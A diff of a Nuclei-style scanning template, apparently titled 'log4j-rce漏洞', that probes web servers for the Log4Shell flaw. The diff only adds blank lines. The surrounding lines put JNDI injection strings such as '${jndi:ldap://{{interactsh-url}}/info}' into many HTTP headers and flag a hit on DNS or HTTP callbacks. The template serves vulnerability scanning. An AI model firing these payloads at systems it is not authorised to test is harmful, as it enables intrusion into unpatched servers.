@@ -1,15 +1,18 @@
 id: log4j-fuzz-head-poc
+
 info:
   name: log4j-rce漏洞
   author: xxx
   severity: critical
   tags: apache,rce
+
 requests:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
         {{log4j_payloads}}
+
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -35,6 +38,7 @@ requests:
         - 'X-Wap-Profile: ${jndi:ldap://{{interactsh-url}}/info}'
         - 'X-Api-Version: ${jndi:ldap://{{interactsh-url}}/info}'
         - 'Host: ${jndi:ldap://{{interactsh-url}}/info}'
+                
     attack: clusterbomb
     matchers-condition: or
     matchers:
@@ -43,6 +47,7 @@ requests:
         name: http
         words:
           - "http"
+
       - type: word
         part: interactsh_protocol
         name: dns
